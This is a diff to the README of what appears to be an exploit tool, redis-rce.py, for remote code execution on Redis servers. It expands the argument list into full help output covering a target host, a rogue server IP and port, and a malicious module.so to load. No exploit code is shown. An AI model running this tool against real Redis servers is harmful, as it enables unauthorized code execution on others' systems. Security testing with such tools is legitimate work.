@@ -65,10 +65,18 @@ python3 redis-rce.py --rhost <target_ip> --lhost <your_ip>
 
 Arguments:
 ```bash
---rhost     Target Redis host (IP or hostname)
---lhost     Local IP of attacker (used to serve `module.so`)
---lport     Port the rogue server will listen on (default `6379`)
---exp       Path to the compiled `.so` file (default `module.so`)
+$ ./redis-rce.py -h
+Usage: redis-rce.py [options]
+
+Options:
+  -h, --help           show this help message and exit
+  --rhost=REMOTE_HOST  target host
+  --rport=REMOTE_PORT  target redis port (default 6379)
+  --lhost=LOCAL_HOST   rogue server ip
+  --lport=LOCAL_PORT   rogue server listen port (default 6379)
+  --exp=EXP_FILE       Redis Module to load (default module.so)
+  -v, --verbose        Show full data stream (optional)
+  --passwd=RPASSWD     target redis password (optional)
 ```
 
 Example:
